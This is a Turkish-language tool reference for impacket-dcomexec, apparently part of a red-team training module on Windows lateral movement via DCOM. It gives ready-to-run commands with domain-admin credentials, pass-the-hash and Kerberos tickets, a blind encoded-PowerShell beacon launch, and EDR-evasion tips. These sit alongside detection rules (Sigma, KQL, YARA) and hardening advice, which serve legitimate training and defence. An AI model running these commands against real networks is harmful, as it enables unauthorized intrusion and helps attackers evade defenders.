# impacket-dcomexec

> **Kategori:** [11. YANAL HAREKET VE UZAK KOD YÜRÜTME (LATERAL MOVEMENT & EXECUTION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Uzak Windows sistemlerinde MMC20.Application, ShellWindows ve ShellBrowserWindow gibi meşru DCOM/COM nesnelerini aktive ederek servis kurmadan ve mmc.exe / explorer.exe süreç ağacı altında uzaktan kod yürüten Impacket yanal hareket aracı.

---

## 1. Genel Bakış ve Amaç

`impacket-dcomexec` (veya `dcomexec.py`), Fortra/SecureAuth Impacket kütüphanesi içerisinde yer alan ve Windows Dağıtılmış Bileşen Nesne Modeli (Distributed Component Object Model - DCOM) arayüzünü kötüye kullanarak uzaktan kod yürütmeyi (RCE) sağlayan gelişmiş bir yanal hareket aracıdır.

Active Directory ortamlarında geleneksel yanal hareket araçları (`psexec`, `smbexec`) Windows Servis Kontrol Yöneticisi (SCM) üzerinde servis oluşturarak `System Event ID 7045` üretir. `wmiexec` ise `WmiPrvSE.exe` alt süreci olarak `cmd.exe` başlatır; bu durum modern EDR sistemlerinin davranışsal analiz kuralları tarafından sıkı bir şekilde izlenir. `impacket-dcomexec`, bu klasik süreç ebeveynliği kalıplarını kırmak için geliştirilmiştir.

dcomexec, Windows'un meşru sistem ve yönetim nesnelerini (COM class'ları) DCOM RPC protokolü üzerinden uzaktan örnekler (instantiate eder) ve bu nesnelerin yöntemlerini (methods) çağırarak işletim sistemi komutları çalıştırır. Özellikle `ShellWindows` nesnesi kullanıldığında, komut doğrudan oturum açmış kullanıcının `explorer.exe` (Windows Gezgini) süreci altından türetilir. Bu durum, EDR ve SOC analistleri için tespit edilmesi son derece güç, doğal bir kullanıcı eylemi görünümü sunar.

```
+-------------------------------------------------------------------------+
|                       impacket-dcomexec Mimari Akışı                    |
+-------------------------------------------------------------------------+
                               |
               Linux Operatörü (Kali / C2 Host)
         [dcomexec.py -object ShellWindows corp.local/admin:pass@target]
                               v
                     +--------------------+
                     | dcomexec.py Engine |
                     +--------------------+
                               |
               1. RPC Endpoint Mapper (TCP 135)
               2. DCOM Port Negotiation (TCP 49152-65535)
               Activation Request (CLSID / IID)
                               v
                +------------------------------+
                | Hedef Sunucu DCOM Subsystem  |
                +------------------------------+
                               |
            +------------------+------------------+
            |                                     |
 3a. MMC20.Application                 3b. ShellWindows / Browser
     CLSID: 49B2791A-...                   CLSID: 9BA05972-...
     ActiveView.ExecuteShellCommand()      Document.Application.ShellExecute()
            |                                     |
            v                                     v
     +--------------+                      +--------------+
     |   mmc.exe    |                      | explorer.exe |
     +--------------+                      +--------------+
            |                                     |
            +-> cmd.exe /Q /c whoami > \\127.0.0.1\ADMIN$\__out
                               |
               4. SMB ReadFile(\\Target\ADMIN$\__out)
               [Çıktı Linux Konsoluna Aktarılır]
                               |
               5. SMB DeleteFile(__out)
```

### 1.1 Desteklenen DCOM Nesneleri ve Karşılaştırması
impacket-dcomexec üç ana DCOM nesnesini destekler:
* **`MMC20.Application` (Varsayılan):** Microsoft Management Console arayüzünü temsil eder (`CLSID: 49B2791A-B1AE-4C90-9B8E-E860BA07F889`). `Document.ActiveView.ExecuteShellCommand` yöntemi ile komut çalıştırır. Ebeveyn süreç: `mmc.exe`.
* **`ShellWindows`:** Windows kabuk pencerelerini yönetir (`CLSID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39`). `Document.Application.ShellExecute` yöntemi ile kod koşturur. Ebeveyn süreç: `explorer.exe`. Hedef makinede etkileşimli bir kullanıcı oturumunun (GUI/RDP) açık olmasını gerektirir.
* **`ShellBrowserWindow`:** Internet Explorer / Shell Browser pencere nesnesidir (`CLSID: C08AFD90-F2A1-11D1-8455-00A0C91F3880`). `Document.Application.ShellExecute` ile komut çalıştırır. Ebeveyn süreç: `explorer.exe`.

### 1.2 DCOM Protokol Mekanizması ve IDispatch Arayüzü
dcomexec, Windows Bileşen Nesne Modeli üzerinde şu adımlarla çalışır:
1. **DCOM Aktivasyonu (`CoCreateInstanceEx`):** RPC Endpoint Mapper (TCP 135) üzerinden hedef sistemdeki DCOM sunucusuna belirtilen CLSID değeriyle bağlanılır.
2. **Arayüz Sorgusu (`IRemUnknown::RemQueryInterface`):** Nesnenin `IDispatch` arayüzü elde edilir.
3. **Dinamik Metot Çağrısı (`IDispatch::Invoke`):** `ExecuteShellCommand` veya `ShellExecute` fonksiyonlarının `DISPID` değerleri sorgulanır ve komut dizgisi güvenli RPC paketleri içerisinde aktarılır.
4. **Süreç Başlatma:** DCOM servis motoru (`rpcss`), hedef nesneyi ayağa kaldırarak komutu ilgili süreç (`mmc.exe` veya `explorer.exe`) üzerinden çalıştırır.

### Neden Önemli?

| Senaryo / İhtiyaç | Operasyonel Açıklama |
|---|---|
| **Ebeveyn Süreç Manipülasyonu (Parent Spoofing)** | Komutların `services.exe` veya `WmiPrvSE.exe` yerine meşru `explorer.exe` veya `mmc.exe` altından başlatılması. |
| **Servissiz ve Dosyasız İcra** | Windows Servis Yöneticisi'ne dokunmadan ve diske ikili dosya yazmadan uzaktan kod çalıştırma. |
| **Pass-the-Hash ve Kerberos Desteği** | NTLM hash veya Kerberos biletleri ile DCOM RPC seviyesinde tam yetkili kimlik doğrulama. |
| **WMI Filtrelerini Atlama** | WMI protokolünün (`root\cimv2`) devre dışı bırakıldığı veya engellendiği ortamlarda DCOM nesnelerine yönelme. |
| **Esnek Nesne Seçimi** | Hedef sistemdeki aktif oturum durumuna göre `MMC20`, `ShellWindows` veya `ShellBrowserWindow` seçebilme. |

### Alternatif Araçlarla Karşılaştırma

| Özellik / Boyut | impacket-dcomexec | impacket-wmiexec | impacket-psexec | Evil-WinRM |
|---|---|---|---|---|
| **Kullanılan Protokol** | DCOM (RPC 135) | DCOM / WMI (RPC 135)| SMB SCM (TCP 445) | WinRM (TCP 5985) |
| **Ebeveyn Süreç (Parent)**| `mmc.exe` / `explorer.exe`| `WmiPrvSE.exe` | `services.exe` | `wsmprovhost.exe` |
| **Servis Oluşturma** | Hayır | Hayır | Evet (Event ID 7045) | Hayır |
| **Kullanıcı Bağlamı** | Oturum Açan Kullanıcı | Oturum Açan Kullanıcı| `NT AUTHORITY\SYSTEM` | Oturum Açan Kullanıcı |
| **EDR Davranışsal Tespiti**| Düşük / Gizli | Orta | Çok Yüksek | Düşük / Orta |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`impacket-dcomexec`, hedef nesneyi belirlemek için `-object` parametresini kullanır.

### Genel Sözdizimi
```bash
impacket-dcomexec [[etki_alanı/]kullanıcı[:parola]@]<hedef_ip_veya_fqdn> [Komut] [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Bayrak | Açıklama | Örnek Değer |
|---|---|---|---|
| Hedef / Kimlik | `[domain/]user:pass@host` | Etki alanı, kullanıcı adı, parola ve hedef adresi. | `corp.local/admin:Pass!@10.0.0.1` |
| DCOM Nesnesi | `-object` | Kullanılacak DCOM nesnesi (`MMC20`, `ShellWindows`, `ShellBrowserWindow`). | `-object ShellWindows` |
| Pass-the-Hash | `-hashes` | NTLM hash ile kimlik doğrulama (`LMHASH:NTHASH`). | `-hashes :51a26b735c02dc...` |
| Kerberos Auth | `-k` | Kerberos kimlik doğrulaması kullanır (`KRB5CCNAME`). | *Argümansız bayrak* |
| Parolasız Mod | `-no-pass` | Parola sorma promptunu atlar. | *Argümansız bayrak* |
| KDC IP Adresi | `-dc-ip` | Kerberos KDC denetleyicisi IP'si. | `-dc-ip 10.0.0.1` |
| Hedef IP Zorlama | `-target-ip` | Kerberos FQDN bilet talebinde doğrudan soket IP'sini belirtir. | `-target-ip 192.168.1.15` |
| Çıktısız Mod | `-nooutput` | Komut çıktısını yakalamaz; diske ve SMB'ye dokunmadan çalıştırır. | *Argümansız bayrak* |
| Çıktı Paylaşımı | `-share` | Çıktı dosyasının yazılacağı SMB paylaşımı (Varsayılan `ADMIN$`). | `-share C$` |
| Sessiz Komut | `-silentcommand` | `cmd.exe /Q /c` sarmalamasını kaldırıp komutu yalın çalıştırır. | *Argümansız bayrak* |
| Karakter Kodlaması| `-codec` | Çıktı karakter kodlaması (Türkçe sistemler için `cp1254`). | `-codec cp1254` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: MMC20.Application Nesnesi ile Yarı-İnteraktif Kabuk Başlatma
Varsayılan `MMC20.Application` nesnesini kullanarak hedef sunucuda `mmc.exe` sürecinin altında komut kabuğu açma.

```bash
impacket-dcomexec corp.local/da_admin:P@ssword2026!@192.168.1.15
```

**Örnek Konsol Çıktısı:**
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Using MMC20.Application DCOM object...
[*] Connecting to DCOM RPC interface...
[!] Launching semi-interactive shell - build your payload with care!
[!] Press help for extra shell commands
C:\> whoami
corp\da_admin

C:\> tasklist /fi "imagename eq mmc.exe"
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
mmc.exe                       5128 Services                   0     18,432 K

C:\> exit
[*] Cleaning up...
[+] Done
```

### Senaryo 2: ShellWindows ile explorer.exe Altından Komut Koşturma (Yüksek OPSEC)
Hedef makinede aktif oturumu bulunan kullanıcının `explorer.exe` sürecini kullanarak komut yürütme.

```bash
impacket-dcomexec -object ShellWindows corp.local/da_admin:P@ssword2026!@192.168.1.15 "whoami /all"
```

### Senaryo 3: Pass-the-Hash (NTLM Hash) ile ShellBrowserWindow Yürütmesi
Açık metin parola olmadan, ele geçirilen NTLM hash ile `ShellBrowserWindow` nesnesi üzerinden kod çalıştırma.

```bash
impacket-dcomexec -object ShellBrowserWindow -hashes :51a26b735c02dcda234b21651d30f7b1 Administrator@192.168.1.20
```

### Senaryo 4: Kerberos Bileti (.ccache) ile Pass-the-Ticket Yanal Hareketi
Linux bilet önbelleğindeki Kerberos biletini kullanarak NTLM kullanmaksızın DCOM üzerinden oturum açma.

```bash
export KRB5CCNAME=/tmp/da_admin.ccache
impacket-dcomexec -k -no-pass -dc-ip 192.168.1.10 CORP.LOCAL/da_admin@FS01.corp.local
```

### Senaryo 5: Sıfır Dosya İzi ile Kör (Blind) C2 Beacon Yürütme (-nooutput)
Diske çıktı dosyası yazmadan ve SMB paylaşımına bağlanmadan doğrudan ters bağlantı veya Beacon tetikleme.

```bash
impacket-dcomexec -object ShellWindows corp.local/da_admin:P@ss!@192.168.1.15 -nooutput "powershell.exe -enc JABjAG..."
```

### Senaryo 6: C$ Paylaşımını Kullanarak Çıktı Dosyasını Yönlendirme
`ADMIN$` paylaşımının kısıtlandığı ortamlarda çıktı dosyasını `C$` sürücüsüne yönlendirerek komut çalıştırma.

```bash
impacket-dcomexec corp.local/da_admin:P@ss!@192.168.1.15 -share C$ "net localgroup administrators"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[-] DCOM SessionError: 0x80040154 (Class not registered)` | Hedef sistemde belirtilen CLSID/ProgID kayıtlı değil (Örn: Server Core sürümlerinde MMC bulunmayabilir). | `-object ShellBrowserWindow` veya `ShellWindows` nesnesini deneyin. |
| `[-] ShellWindows Error: The object invoked has disconnected from its clients (0x80010108)` | Hedef sistemde `explorer.exe` çalışmıyor (Oturum açmış kullanıcı yok veya ekran kilitli). | `-object MMC20` nesnesine geçiş yapın (MMC etkileşimli kullanıcı gerektirmez). |
| `[-] DCOM SessionError: 0x80070005 (Access is denied)` | Kimlik doğrulandı ancak kullanıcının DCOM Launch ve Activate izinleri yok ya da Remote UAC devrede. | Etki alanı yöneticisi hesabı kullanın; yerel hesap ise `LocalAccountTokenFilterPolicy=1` olmalıdır. |
| `[-] Connection refused on port 135` | Hedef makinede RPC servisi kapalı veya ağ güvenlik duvarı TCP 135'i engelliyor. | Hedefin açık olduğunu doğrulayın; TCP 135 engelliyse SMB tabanlı `impacket-psexec` veya WinRM `Evil-WinRM` kullanın. |
| `RPC_S_SERVER_UNAVAILABLE (0x800706BA)` | Dinamik RPC port aralığı (TCP 49152-65535) güvenlik duvarı tarafından engelleniyor. | Güvenlik duvarı kurallarını inceleyin veya tek port kullanan WinRM protokolüne geçin. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Hedef makinenin SPN kaydı Active Directory KDC'de çözümlenemedi. | Hedef IP yerine FQDN (`FS01.corp.local`) kullanın ve `-dc-ip` parametresi sağlayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

impacket-dcomexec, özellikle `ShellWindows` nesnesi ile kullanıldığında `explorer.exe` ebeveynliği sağladığı için geleneksel PsExec ve wmiexec kurallarını **tamamen atlatabilen** çok yüksek bir OPSEC avantajına sahiptir. Ancak DCOM aktivasyon günlükleri ve çıktı dosyasının SMB üzerinden çekilmesi uç noktada iz bırakır.

```
[impacket-dcomexec Yürütmesi]
          │
          ├──> RPC/DCOM Aktivasyonu ───────────> Windows Event ID 4624 (Logon Type 3)
          │                                      System Event ID 10016 (DCOM Runtime Warning)
          │
          ├──> DCOM Nesnesinin Başlatılması ────> Sysmon Event ID 1 (Process Creation)
          │                                      ParentImage: mmc.exe VEYA explorer.exe
          │
          ├──> cmd.exe Sürecinin Türetilmesi ───> Sysmon Event ID 1 (mmc.exe/explorer.exe -> cmd.exe)
          │
          └──> Çıktı Dosyasına Yönlendirme ──────> Event ID 5145 (AccessMask: 0x2 / WriteData)
               (NOT: -nooutput modunda SMB dosya izleri tamamen engellenir)
```

### 5.1 Bırakılan İzler ve Olay Günlükleri
* **Sysmon Event ID 1 (Process Creation):**
  * `MMC20` seçildiğinde: `ParentImage: C:\Windows\System32\mmc.exe` -> `Image: cmd.exe`.
  * `ShellWindows` seçildiğinde: `ParentImage: C:\Windows\explorer.exe` -> `Image: cmd.exe`. `explorer.exe`'nin komut istemi başlatması birçok EDR için meşru kullanıcı davranışı gibi görünür.
* **Security Event ID 4624 (Logon Type 3):** DCOM nesnesini tetikleyen kullanıcı hesabı adına ağ oturumu açılır.
* **System Event ID 10016 (DistributedCOM):** Kullanıcının DCOM nesnesi üzerinde yeterli yerel/uzaktan aktivasyon izni bulunmadığında hata günlüğü olarak düşer.
* **Security Event ID 5145 (Detailed File Share Access):** Varsayılan modda `ADMIN$` altında geçici çıktı dosyasının oluşturulması ve silinmesi loglanır.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
|---|---|---|---|
| **Lateral Movement** | [T1021.003](https://attack.mitre.org/techniques/T1021/003/) | Distributed Component Object Model | DCOM nesneleri (MMC20, ShellWindows) üzerinden yanal hareket. |
| **Execution** | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Windows Command Shell | `cmd.exe` üzerinden komut yürütme. |
| **Defense Evasion** | [T1036](https://attack.mitre.org/techniques/T1036/) | Masquerading | `explorer.exe` sürecini ebeveyn olarak kullanarak meşru görünme. |
| **Defense Evasion** | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) | File Deletion | Çıktı dosyasının okunup hemen silinmesi. |

### 5.3 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Teknik Sebebi | Azaltma / Önlem Stratejisi |
|---|---|---|
| **mmc.exe Süreç Anomalisi** | Sunucu üzerinde arka planda aniden `mmc.exe` başlatılması ve `cmd.exe` türetmesi. | `MMC20` yerine aktif kullanıcısı olan makinelerde `-object ShellWindows` nesnesini kullanın. |
| **Geçici Çıktı Dosyası İzi** | `ADMIN$\__output` dosyasının FIM tarafından yakalanması. | `-nooutput` bayrağı ile çıktısız çalışın ve doğrudan ters bağlantı (reverse shell) açın. |
| **Dinamik RPC Port Anomalisi** | Rastgele yüksek portlara (49152+) doğru trafik açılması. | Tek ve sabit bir port üzerinden çalışan WinRM protokolünü (`Evil-WinRM`) tercih edin. |

### 5.4 Tespit Kuralları

#### Sigma Kuralı (Suspicious Process Spawned by MMC or Explorer via DCOM)
```yaml
title: DCOM Lateral Movement via MMC20 or ShellWindows
id: d1e2f3a4-5678-90ab-cdef-ba9876543210
status: production
description: mmc.exe veya explorer.exe sürecinin şüpheli komut satırı parametreleriyle cmd.exe türettiği tespit edildi (dcomexec davranışı).
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    ParentImage|endswith:
      - '\mmc.exe'
      - '\explorer.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
    CommandLine|contains:
      - '/Q /c'
      - '127.0.0.1'
      - '> '
  condition: selection
falsepositives:
  - Kullanıcıların explorer üzerinden elle çalıştırdığı meşru betikler
level: high
```

#### Microsoft Sentinel KQL Sorgusu
```kql
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("mmc.exe", "explorer.exe")
| where FileName in~ ("cmd.exe", "powershell.exe")
| where ProcessCommandLine has "127.0.0.1" and ProcessCommandLine has "/Q /c"
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
| order by TimeGenerated desc
```

#### YARA Kuralı
```yara
rule Impacket_DCOMExec_Script_Artifact {
    meta:
        description = "impacket-dcomexec Python script statik tespiti"
        author = "Antigravity Active Directory Project"
        date = "2026-10-14"
        reference = "https://github.com/fortra/impacket"
    strings:
        $s1 = "dcomexec" ascii wide nocase
        $s2 = "MMC20.Application" ascii
        $s3 = "ShellWindows" ascii
        $s4 = "ShellBrowserWindow" ascii
        $s5 = "ExecuteShellCommand" ascii
    condition:
        3 of ($s*)
}
```

### 5.5 Savunma Karşılığı ve Sertleştirme (Hardening)
* **DCOM Uzaktan Aktivasyon İzinlerinin Sınırlandırılması:** `dcomcnfg` üzerinden `MMC20.Application` ve `ShellWindows` nesnelerine uzaktan başlatma ve etkinleştirme (Remote Launch/Activation) izinleri kaldırılmalıdır.
* **Ana Makine Güvenlik Duvarı ile DCOM İzolasyonu:** İstemciler arası (workstation-to-workstation) TCP 135 ve dinamik RPC portları (49152-65535) engellenmelidir.
* **Remote UAC ve En Az Yetki:** `LocalAccountTokenFilterPolicy = 0` tutularak yerel hesapların uzaktan DCOM arayüzlerine tam yetkili bağlanması önlenmelidir.
* **Sysmon ve Davranışsal Süreç İzleme:** `mmc.exe` ve `explorer.exe` süreçlerinin komut satırı argümanları EDR üzerinde izlenmeli ve `cmd.exe /Q /c` kalıpları için alarm üretilmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Varsayılan MMC20 Nesnesi ile Yarı-İnteraktif Kabuk Alma
impacket-dcomexec corp.local/da_admin:P@ssword2026!@192.168.1.15

# 2. ShellWindows ile explorer.exe Altından Komut Koşturma
impacket-dcomexec -object ShellWindows corp.local/da_admin:P@ssword2026!@192.168.1.15 "whoami /all"

# 3. Pass-the-Hash (NTLM Hash) ile ShellBrowserWindow Kullanımı
impacket-dcomexec -object ShellBrowserWindow -hashes :51a26b735c02dcda234b21651d30f7b1 Administrator@192.168.1.20

# 4. Kerberos Bileti (.ccache) ile Parolasız DCOM Yanal Hareketi
export KRB5CCNAME=/tmp/da_admin.ccache && impacket-dcomexec -k -no-pass -dc-ip 192.168.1.10 CORP.LOCAL/da_admin@FS01.corp.local

# 5. Sıfır Dosya İzi ile Kör (Blind) Kod Yürütme
impacket-dcomexec -object ShellWindows corp.local/da_admin:P@ss!@192.168.1.15 -nooutput "powershell.exe -enc ..."

# 6. Çıktı Paylaşımı Olarak C$ Sürücüsünü Belirleme
impacket-dcomexec corp.local/da_admin:P@ss!@192.168.1.15 -share C$

# 7. Tek Komut Çalıştırıp Sonucu Alma ve Çıkma
impacket-dcomexec corp.local/da_admin:P@ss!@192.168.1.15 "net localgroup administrators"

# 8. Yerel SAM Hesabı ile DCOM Oturumu Başlatma
impacket-dcomexec ./Administrator:LocalAdminPass!@192.168.1.20

# 9. Türkçe Karakter Desteği için Codec Tanımlama
impacket-dcomexec corp.local/da_admin:P@ss!@192.168.1.15 -codec cp1254

# 10. Sessiz Mod ile cmd.exe /Q /c Sarmalamasını Kaldırma
impacket-dcomexec corp.local/da_admin:P@ss!@192.168.1.15 -silentcommand "whoami"
```

### Komut Detay Analizleri

#### 1. Varsayılan MMC20 Nesnesi ile Yarı-İnteraktif Kabuk Alma
* **Ne Yapar?:** TCP 135 üzerinden `MMC20.Application` DCOM nesnesini aktive eder, `mmc.exe` sürecini başlatır ve servis kurmadan komut kabuğu sunar.
* **Ne Zaman Kullanılır?:** SCM servis alarmlarını tetiklemeden ve kullanıcı oturumuna ihtiyaç duymadan yanal hareket için.
* **Parametreler:**
  * `corp.local/da_admin:P@ssword2026!`: Etki alanı kimlik bilgileri.
  * `@192.168.1.15`: Hedef sunucu IP adresi.

#### 2. ShellWindows ile explorer.exe Altından Komut Koşturma
* **Ne Yapar?:** `ShellWindows` nesnesini çağırarak komutu hedef makinede oturum açmış kullanıcının `explorer.exe` sürecinin altında çalıştırır.
* **Ne Zaman Kullanılır?:** EDR süreç ağacı analizlerini atlatmak ve doğal kullanıcı davranışı görünümü vermek için.
* **Parametreler:**
  * `-object ShellWindows`: Hedef DCOM sınıfı.
  * `"whoami /all"`: Yürütülecek komut.

#### 3. Pass-the-Hash (NTLM Hash) ile ShellBrowserWindow Kullanımı
* **Ne Yapar?:** Açık parola olmadan, ele geçirilen NTLM hash ile `ShellBrowserWindow` nesnesi üzerinden komut yürütür.
* **Ne Zaman Kullanılır?:** Hash ele geçirildiğinde ve parola kırılamadığında.
* **Parametreler:**
  * `-hashes :<NTHASH>`: NTLM hash değeri.
  * `-object ShellBrowserWindow`: Internet Explorer/Shell tarayıcı nesnesi.

#### 4. Kerberos Bileti (.ccache) ile Parolasız DCOM Yanal Hareketi
* **Ne Yapar?:** Linux bilet önbelleğindeki Kerberos biletini kullanarak NTLM trafiği oluşturmadan hedefte DCOM oturumu açar.
* **Ne Zaman Kullanılır?:** NTLM izleme alarmlarından kaçınmak ve Kerberos ile yanal sıçrama yapmak için.
* **Parametreler:**
  * `-k`: Kerberos kimlik doğrulaması.
  * `-no-pass`: Parola sorma adımını atlar.

#### 5. Sıfır Dosya İzi ile Kör (Blind) Kod Yürütme
* **Ne Yapar?:** Çıktı dosyasını SMB paylaşımına yönlendirmez; komutu arka planda çalıştırıp hemen çıkar.
* **Ne Zaman Kullanılır?:** C2 ajanı veya ters bağlantı (reverse shell) tetiklerken diske kesinlikle dokunmamak için.
* **Parametreler:**
  * `-nooutput`: Çıktı yakalamayı ve dosya oluşturmayı tamamen iptal eder.

#### 6. Çıktı Paylaşımı Olarak C$ Sürücüsünü Belirleme
* **Ne Yapar?:** Çıktı dosyasını `ADMIN$` (`C:\Windows\`) yerine `C$` kök dizinine yazar.
* **Ne Zaman Kullanılır?:** `ADMIN$` paylaşımının kısıtlandığı veya izlendiği durumlarda.
* **Parametreler:**
  * `-share C$`: Çıktı paylaşımını belirler.

#### 7. Tek Komut Çalıştırıp Sonucu Alma ve Çıkma
* **Ne Yapar?:** İnteraktif döngüye girmeden tek bir komut işletir, çıktısını ekrana yazar ve çıkar.
* **Ne Zaman Kullanılır?:** Hızlı yetki veya grup kontrolü yapmak için.
* **Parametreler:**
  * Komut dizesi parametre olarak sona eklenir.

#### 8. Yerel SAM Hesabı ile DCOM Oturumu Başlatma
* **Ne Yapar?:** Etki alanı yerine hedef makinenin yerel SAM veritabanındaki hesapla kimlik doğrular.
* **Ne Zaman Kullanılır?:** LAPS parolası veya yerel yönetici parolası bilinen bağımsız sistemlerde.
* **Parametreler:**
  * `./Administrator`: Yerel hesap bağlamı.

#### 9. Türkçe Karakter Desteği için Codec Tanımlama
* **Ne Yapar?:** Türkçe Windows sistemlerinden dönen çıktılardaki karakter bozulmalarını düzeltir.
* **Ne Zaman Kullanılır?:** Çıktıların okunabilirliğini korumak için.
* **Parametreler:**
  * `-codec cp1254`: Windows-1254 Türkçe kodlaması.

#### 10. Sessiz Mod ile cmd.exe /Q /c Sarmalamasını Kaldırma
* **Ne Yapar?:** Komutun `cmd.exe /Q /c` parametreleri ile sarmalanmasını önler; doğrudan belirtilen ikiliyi çalıştırır.
* **Ne Zaman Kullanılır?:** EDR komut satırı inceleme kurallarını yanıltmak için.
* **Parametreler:**
  * `-silentcommand`: Komut sarmalama bayrağını kaldırır.

---

## Kaynaklar
* [Impacket Resmi GitHub Deposu](https://github.com/fortra/impacket)
* [Microsoft Dokümantasyonu: [MS-DCOM] Distributed Component Object Model Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/)
* [MITRE ATT&CK: Distributed Component Object Model (T1021.003)](https://attack.mitre.org/techniques/T1021/003/)
* [Enigma0x3 Blog: Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [Enigma0x3 Blog: Lateral Movement using Excel and ShellWindows](https://enigma0x3.net/2017/01/23/lateral-movement-via-excel-application-and-dcom/)
* [SpecterOps: Modern Lateral Movement via DCOM](https://posts.specterops.io/)

---

> **Önceki:** [← impacket-atexec](./impacket-atexec.md) · **Sonraki:** [Evil-WinRM →](./Evil-WinRM.md)

